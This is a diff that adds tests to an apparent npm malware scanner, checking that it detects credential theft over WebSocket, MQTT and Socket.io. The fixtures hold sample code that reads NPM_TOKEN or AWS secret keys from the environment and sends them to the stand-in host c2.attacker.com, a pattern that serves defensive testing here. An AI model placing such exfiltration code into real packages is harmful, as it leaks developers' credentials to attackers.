@@ -719,6 +719,100 @@ fetch('https://evil.com/exfil', { body: h });`;
     assert(threats.length > 0,
       `object-alias-exfil.js should produce threats, got ${threats.length}`);
   });
+
+  // --- v2.10.1: WebSocket/MQTT/Socket.io sink detection (B1 bypass fix) ---
+
+  await asyncTest('DATAFLOW B1: ws.send credential exfil detected as suspicious_dataflow', async () => {
+    const tmp = makeTempPkg(
+      `const ws = require('ws');\n` +
+      `const cred = process.env.NPM_TOKEN;\n` +
+      `const socket = new ws('wss://c2.attacker.com');\n` +
+      `socket.on('open', () => socket.send(cred));`
+    );
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow' && t.message.includes('ws.send'));
+      assert(t, 'Should detect ws.send as network sink for credential exfil');
+      assert(t.severity === 'CRITICAL', `Should be CRITICAL, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW B1: mqtt.publish credential exfil detected', async () => {
+    const tmp = makeTempPkg(
+      `const mqtt = require('mqtt');\n` +
+      `const token = process.env.AWS_SECRET_ACCESS_KEY;\n` +
+      `const client = mqtt.connect('mqtt://c2.attacker.com');\n` +
+      `client.on('connect', () => client.publish('data', token));`
+    );
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow' && t.message.includes('mqtt'));
+      assert(t, 'Should detect mqtt.publish as network sink for credential exfil');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW B1: socket.io-client emit credential exfil detected', async () => {
+    const tmp = makeTempPkg(
+      `const io = require('socket.io-client');\n` +
+      `const secret = process.env.NPM_TOKEN;\n` +
+      `const socket = io('https://c2.attacker.com');\n` +
+      `socket.emit('exfil', secret);`
+    );
+    try {
+      const result = await runScanDirect(tmp);
+      const envT = result.threats.find(t => t.type === 'env_access');
+      assert(envT, 'Should detect env_access for NPM_TOKEN');
+      const sinkT = result.threats.find(t => t.type === 'suspicious_module_sink');
+      assert(sinkT, 'Should detect suspicious_module_sink for socket.io-client');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW B1: suspicious_module_sink marker emitted for ws', async () => {
+    const tmp = makeTempPkg(
+      `const ws = require('ws');\n` +
+      `const cred = process.env.NPM_TOKEN;\n` +
+      `const socket = new ws('wss://c2.attacker.com');\n` +
+      `socket.on('open', () => socket.send(cred));`
+    );
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_module_sink');
+      assert(t, 'Should emit suspicious_module_sink marker for ws');
+      assert(t.severity === 'MEDIUM', `Should be MEDIUM, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW B1: ws echo server (legit) — no suspicious_dataflow', async () => {
+    const tmp = makeTempPkg(
+      `const WebSocket = require('ws');\n` +
+      `const wss = new WebSocket.Server({ port: 8080 });\n` +
+      `wss.on('connection', (ws) => {\n` +
+      `  ws.on('message', (msg) => {\n` +
+      `    console.log('Received:', msg);\n` +
+      `    ws.send('echo: ' + msg);\n` +
+      `  });\n` +
+      `});`
+    );
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(!t, 'Legit ws echo server should NOT trigger suspicious_dataflow');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW B1: ws exfil sample scores >= 35', async () => {
+    const tmp = makeTempPkg(
+      `const ws = require('ws');\n` +
+      `const cred = process.env.NPM_TOKEN;\n` +
+      `const socket = new ws('wss://c2.attacker.com');\n` +
+      `socket.on('open', () => socket.send(cred));`
+    );
+    try {
+      const result = await runScanDirect(tmp);
+      const score = result.summary.riskScore;
+      assert(score >= 35, `Score should be >= 35, got ${score}`);
+    } finally { cleanupTemp(tmp); }
+  });
 }
 
 module.exports = { runDataflowTests };
